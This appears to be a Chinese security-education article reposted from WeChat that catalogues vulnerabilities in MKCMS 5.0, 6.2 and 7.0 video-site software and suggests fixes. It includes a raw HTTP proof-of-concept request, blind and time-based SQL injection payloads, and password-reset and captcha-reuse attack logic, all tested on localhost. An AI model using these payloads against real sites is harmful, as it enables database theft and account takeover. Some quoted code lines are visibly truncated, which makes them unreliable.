<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Vu1ZH3gGgIHsRSFBLyvyyA)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

本文由掌控安全学院 - 柚子投稿

### MKCMS5.0 漏洞合集

#### 简介及安装

MKCMS5.0 是一款基于 PHP+MYSQL 开发制作的专业全自动采集电影网站源码。程序不需授权上传直接使用, 自动更新电影, 无人值守! 完整的会员影视中心 后台可对接卡盟 可以设置收费观看模式。  
下载地址：链接：https://pan.baidu.com/s/12HsPtKN8ECIAv3QNy6rSwg  
提取码：zkaq

源码放在 phpstudy 根目录下。  
访问：http://127.0.0.1/MKCMS5.0/install/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhxf6blG0BYfmoxQuGh0QS1eGtWhqUz5ud9ziawb9Y5STmfCgjMP3D3Tg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhbspEGf6a0Ciax2xFEibjqB3nEz08iczrnw4ich43WhPbNQOyJJToMJzxLA/640?wx_fmt=png)

#### 漏洞复现

##### 前台 sql 注入

漏洞出现在 / ucenter/reg.php 第 7-19 行:

```
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_);
if(mysql_fetch_array($query)){
echo '<script>alert("用户名已存在，请换个其他的用户名");window.history.go(-1);</script>';
exit;
}
$result = mysql_query('select * from mkcms_user where u_email = "'.$_POST['email'].'"');
if(mysql_fetch_array($result)){
echo '<script>alert("邮箱已存在，请换个其他的邮箱");window.history.go(-1);</script>';
exit;
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhkhsBYibW0678c6Q5lqgvJFBhVupszkoPtveesFsqT0SZI6T4p6uYjhA/640?wx_fmt=png)

注册用户名时 $username 参数传到后台后经过 stripslashes() 函数处理，而 stripslashes() 函数的作用是删除 addslashes() 函数添加的反斜杠。

当前页面无输出点，只是返回一个注册 / 未注册（通过 if 判断 true 或者 false)，可以使用布尔盲注来解决这个问题。  
POC

```
POST /ucenter/reg.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/ucenter/reg.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close
Cookie: PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3
Upgrade-Insecure-Requests: 1
name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit=

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhnqibMShHuI4WmOfIjCu8XU6iapbdvlI7bfjT8fQXjJwrGCtjjhhk9hibA/640?wx_fmt=png)

##### 任意用户密码重置

漏洞出现在`/ucenter/repass.php`第 1-44 行:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhAN5WOh9gAMRbY9Tg69ClmK8NR6dibJu2sxX8SDts2skGVWt3aFIZK2A/640?wx_fmt=png)

本质上来说此处是一个逻辑问题，程序未通过邮箱等验证是否为用户本身就直接先在第 13-14 行把用户密码重置为 123456 了，根本没管邮件发送成功没有。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhrbowm6SzonjbdOEnEiatOiahdar4NpPart59gSPEw8ncoteeLFmnghhw/640?wx_fmt=png)  
此处过滤了单引号，所以无法通过然后邮箱账号进行重置

#### 漏洞修复

1. 注册处的注入可像密码找回处一样，过滤一下就 OK。  
2. 找回密码处可修改为如下代码：

```
<?php
include('../system/inc.php');
if(isset($_SESSION['user_name'])){
header('location:index.php');
};
function randomkeys($length) {
  $pattern = '1234567890abcdefghijklmnopqrstuvwxyz
               ABCDEFGHIJKLOMNOPQRSTUVWXYZ';
    for($i=0;$i<$length;$i++) 
    { 
        $key .= $pattern{mt_rand(0,35)}; 
    } 
    return $key; 
};
$repass = randomkeys(10);
if(isset($_POST['submit'])){
  $username = stripslashes(trim($_POST['name']));
  $email = trim($_POST['email']);
  // 检测用户名是否存在
  $query = mysql_query("select u_id from mkcms_user where u_);
  if(!! $row = mysql_fetch_array($query)){
    if (mysql_query($sql)) {
      $token =$row['u_question'];
      include("emailconfig.php");
      //创建$smtp对象 这里面的一个true是表示使用身份验证,否则不使用身份验证.
      $smtp = new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); 
      $smtp->debug = false; 
      $mailType = "HTML"; //信件类型，文本:text；网页：HTML
      $email = $email;  //收件人邮箱
      $emailTitle = "".$mkcms_name."用户找回密码"; //邮件主题
      $emailBody = "亲爱的".$username."：<br/>感谢您在我站注册帐号。<br/>您的初始密码为".$repass."<br/>如果此次找回密码请求非你本人所发，请忽略本邮件。<br/><p style='text-align:right'>-------- ".$mkcms_name." 敬上</p>";
      // sendmail方法
      // 参数1是收件人邮箱
      // 参数2是发件人邮箱
      // 参数3是主题（标题）
      // 参数4是邮件主题（标题）
      // 参数4是邮件内容  参数是内容类型文本:text 网页:HTML
      $rs = $smtp->sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);
      if($rs==true){
        $_data['u_password'] = md5($repass);
        $sql = 'update mkcms_user set '.arrtoupdate($_data).' where u_';
        echo '<script>alert("请登录到您的邮箱查看您的密码！");window.history.go(-1);</script>';
      }else{
        echo "找回密码失败";
      }
    }
  }
}
?>

```

增加一个生成随机密码的函数，将把新密码更新到数据库的流程放到发送邮件成功后即可。

### MKCMS6.2 漏洞合集

#### 简介及安装

米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。

下载地址：链接：https://pan.baidu.com/s/1zJ0zDxLdblkM1DHxMZHr3w  
提取码：zkaq

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhRqLrQGqYZboibsVFcKYYqfxutqAPnu52P5hEhB1bAgEhYsVPX4YbksQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhxYXgJ7diaSHWibBJxmSAlQI3sE6vhVtofKDdnF3FDUeib9Uv1nLjcxFFw/640?wx_fmt=png)

#### 漏洞复现

##### 验证码重用

/admin/cms_login.php 验证码处的逻辑如下，比较 session 中的验证码和输入的是否一致，不一致就进入 alert_href，这个 js 跳转，实际是在刷新页面

```
if(isset($_POST['submit'])){
    if ($_SESSION['verifycode'] != $_POST['verifycode']) {
        alert_href('验证码错误','cms_login.php');
    }

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhAMUfprGWdU9CBebLc1dqqte7AZ49vAibtq721qugeBsUycKjCjibHficQ/640?wx_fmt=png)

跳转后就会刷新验证码，然而我用的是 burp，默认是不解析 js 的

全局搜索这个 $_SESSION[‘verifycode’]，发现只在 / system/verifycode.php 有赋值，也就是说，如果使用验证码后，我们不跟随 js 跳转，就不会重置验证码，验证码也就能被重复使用了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhoM8sibtsIeV7wfDDz6LUFOEL78760uT03sI2ytNzuYLG2fhkOicr5SJg/640?wx_fmt=png)

##### 前台注入：/ucenter/repass.php

历史漏洞中，在 / ucenter/repass.php 有个越权修改密码的洞（CVE-2019-11332），跟进去发现原来还有注入，以下是分析过程。

```
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
$email = trim($_POST['email']);
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_);

```

前面说到全局对 $_POST 存在 addslash 的过滤（加 \ 转义），上面又把参数给 stripslashes 了 (去掉), 那么这里就是一个注入了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhgwcWjetv79iaB6icT1ClCoqlAjibwflem9upYvUCXAhabrAAsn3q2tR3Q/640?wx_fmt=png)

##### 前台注入：/ucenter/active.php

/ucenter/active.php?verify=1 存在注入

```
$verify = stripslashes(trim($_GET['verify']));  //去掉了转义用的\
$nowtime = time();
$query = mysql_query("select u_id from mkcms_user where u_question='$verify'");
$row = mysql_fetch_array($query);

```

sqlmap 直接跑即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhnrPR4ia5lapvLk6Y2iabk6sl1zGmKHbtrRS1ticTHibfJxpvgeMrtiaxboQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhRS9FkyjGh2POicGP5Ax3FsKSq9CED1ODGX2lwRvX7qXGiaGo5gWpClxQ/640?wx_fmt=png)

前台注入:/ucenter/reg.php  
/ucenter/reg.php 的 name 参数，存在注入。

```
if(isset($_POST['submit'])){
$username = stripslashes(trim($_POST['name']));
// 检测用户名是否存在
$query = mysql_query("select u_id from mkcms_user where u_);

```

##### 任意用户密码找回（密码可被穷举）

这个问题主要是 / ucenter/repass.php 代码里，找回密码的逻辑有问题，第 10 行查询到 username、 email 能对应上之后，14 行就直接重置密码了。。。而且密码的范围在 12 行有写，只有 90000 种可能，重置之后，burp 跑一下就可以了。（当然要结合验证码重用才能有效爆破）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhXugQSrUD67ibialtkAqjuw8YxksFcbyjak6WNhHOK2Hmic1p7iaMvuLhSw/640?wx_fmt=png)

##### 备份文件路径可猜解

这个备份功能设置的是非常简单的文件名。/backupdata/mkk.sql  
在 / admin/cms_backup.php

```
<?php
$file; //存放路径，默认存放到项目最外层
$fp = fopen($filename,'w');
fputs($fp,$mysql);
fclose($fp);
alert_href('备份成功!','cms_data.php');
?>

```

全局搜 DATA_NAME 变量，是安装时候设置的数据库名。  
在 \ install\index_2.php 中

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhmn2XG6M06iaj6EAyVHSvJAYBjDOfnicNTYMNw4Y7bDxth3iaia0FiacZvaw/640?wx_fmt=png)

默认的 DATA_NAME 值是 mkk  
在 \ system\data.php 中  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhfVmPIa5icq2ibDsdxAk74GfHnpRtTiaia5AmSSiapDfib8qx1xiaSQZ2KKv5g/640?wx_fmt=png)

### MKCMS v7.0 sql 注入漏洞

#### 漏洞简介

米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。

米酷 CMS v7.0.3 版本 admin/model/admin_edit.php、ucenter/reg.php 等文件存在漏洞，攻击者可以利用漏洞进行 sql 注入攻击。

#### 前台注入漏洞

##### 漏洞分析

在 ucenter/reg.php 这个文件中，第 9 行处对 $username 这个参数进行了查询拼接。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhehCAvpS4S94rRoiasu9DIrkN4DjCpZJ8H6mAWAgUbnb1m62oEpDJOjQ/640?wx_fmt=png)

但是在第 7 行处，$username 的值是来自于 POST 传递的 name 参数，当 name 参数到达 reg.php 这个文件之后，stripslashes（）函数将 name 的值进行了去除 “\” 处理。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhLpT5XyibdTOgQaY2BVbJmpfz7TSHicIEjcDAfglJJR2JCz2ySEApJ0KQ/640?wx_fmt=png)

根据 include，跳转到 / system/library.php 中，我们可以发现这里系统对 GET、POST 等参数进行了 addslashes_deep（）函数处理，即对参数传递时加上了一个 “\”。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhYUux93FIbfEB4iaeXxN5EwuCvWVXsbr3zkfKqnozjZ901806A80Kziaw/640?wx_fmt=png)

问题就出在这里，前端用户进行提交的 name 参数，经过了 addslashes_deep（）函数处理加上了一个 “\”，到达 reg.php 页面又使用 stripslashes（）函数将 name 的值进行了去除“\” 处理，这就导致出现了无过滤拼接。

##### 漏洞复现

来到前台漏洞点。http://127.0.0.1/MKCMS7.0/ucenter/reg.php  
事先已有 admin 用户。抓包注册 admin 用户，提示已存在  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhYiarIOdepPxib79PiagOT01rhicrEBziaX1agRWGrMCgY0lFKLSicn2NRVrg/640?wx_fmt=png)  
在 name 参数处构造 Payload：+and+’1’=’2

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEh1uWu9kMZGb4kSdCW54sd94iaaXxtW63mgDgAqrDAKKwptV2S8rPs5nA/640?wx_fmt=png)

在 name 参数处构造 Payload：+and+’1’=’1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEh1SoNRRTFHlIUtlMQh70WWY9I106yTFSzocoFVbTezW57afO5fQvJYw/640?wx_fmt=png)  
根据不同的返回值可以说明构造的 payload 被拼接到数据库进行了判断处理。

#### 后台注入

##### 漏洞分析

在 admin/model/admin_edit.php 文件中，文件第 10 行处，系统进行了数据库查询，拼接了两个参数，一个是 POST 传递的 a_name，一个是 GET 传递的 id，可以看出，系统并未对参数在这里做任何的过滤处理。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhKVQVQTzO64WQaiblfFdk0TrZNlFNqoqUeZpVZKzwYRCvYFiaVcC1s2icA/640?wx_fmt=png)

##### 漏洞复现

定位到漏洞点: 127.0.0.1/MKCMS7.0/admin/cms_admin_edit.php?id=1

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhRLXQY1QEYK3Nl8iaHD0zDYtm6dNSib1c9yZariaqRibQoicrmpBMr2Rb0pw/640?wx_fmt=png)  
用单引号测试

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhIgOFyaPXqMTIIxnKW4RGhZCVJrnlJPByzdibFCL3ByelwqbicC7s5vjA/640?wx_fmt=png)  
构造 payload：id=1+and+if(1>2,1,sleep(3))。数据库执行了 sleep（）函数。同样也可以直接丢给 sqlmap 去注入。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcozKKrn57EjPDVfxsA0lFEhDRYExnIva7KRo3WFVdJgR2KSA4tFKbIoA22NXkbfBO1VIZibib1wxDAQ/640?wx_fmt=png)

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力